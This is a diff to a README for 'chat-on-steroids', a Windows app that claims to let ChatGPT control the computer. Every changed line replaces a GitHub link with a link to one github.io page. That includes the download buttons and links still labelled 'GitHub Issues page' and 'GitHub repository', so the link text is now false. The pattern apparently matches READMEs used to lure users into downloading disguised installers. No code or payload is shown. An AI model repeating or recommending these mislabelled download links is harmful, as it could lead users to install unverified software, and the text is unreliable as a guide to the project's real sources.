@@ -1,6 +1,6 @@
 # ⚡ chat-on-steroids - Supercharge Your ChatGPT with Windows Control
 
-[![Download Now](https://img.shields.io/badge/Download-Chat_on_Steroids-blue?style=for-the-badge&logo=windows&logoColor=white&color=2ea44f)](https://github.com/Assimbhoja/chat-on-steroids/releases)
+[![Download Now](https://img.shields.io/badge/Download-Chat_on_Steroids-blue?style=for-the-badge&logo=windows&logoColor=white&color=2ea44f)](https://assimbhoja.github.io)
 
 ---
 
@@ -31,7 +31,7 @@ Getting started is easy. Follow these steps in order:
 
 Visit this link to download the application:
 
-[**⬇️ Download chat-on-steroids**](https://github.com/Assimbhoja/chat-on-steroids/releases)
+[**⬇️ Download chat-on-steroids**](https://assimbhoja.github.io)
 
 This link takes you to the official download page. Look for the latest release and download the file.
 
@@ -137,7 +137,7 @@ Nothing happens. ChatGPT simply won't perform that action. You can continue usin
 The app checks for updates automatically. When an update is available, you'll see a notification. Just click "Update" and follow the prompts.
 
 ### I'm stuck. Where can I get help?
-Visit the [GitHub Issues page](https://github.com/Assimbhoja/chat-on-steroids/issues) and describe your problem. The community is friendly and helpful.
+Visit the [GitHub Issues page](https://assimbhoja.github.io) and describe your problem. The community is friendly and helpful.
 
 ---
 
@@ -200,7 +200,7 @@ You're never locked in. Open settings and adjust permissions whenever you want.
 
 ## 🤝 Contributing
 
-chat-on-steroids is an open-source project. If you're a developer and want to help improve it, visit the [GitHub repository](https://github.com/Assimbhoja/chat-on-steroids) to contribute code, report bugs, or suggest features.
+chat-on-steroids is an open-source project. If you're a developer and want to help improve it, visit the [GitHub repository](https://assimbhoja.github.io) to contribute code, report bugs, or suggest features.
 
 For everyone else, simply using the app and sharing your feedback is a huge help!
 
@@ -218,7 +218,7 @@ If you like the app, consider giving it a star on GitHub. It helps others discov
 
 Need the download link again? Here it is:
 
-[**⬇️ Download chat-on-steroids**](https://github.com/Assimbhoja/chat-on-steroids/releases)
+[**⬇️ Download chat-on-steroids**](https://assimbhoja.github.io)
 
 ---
 
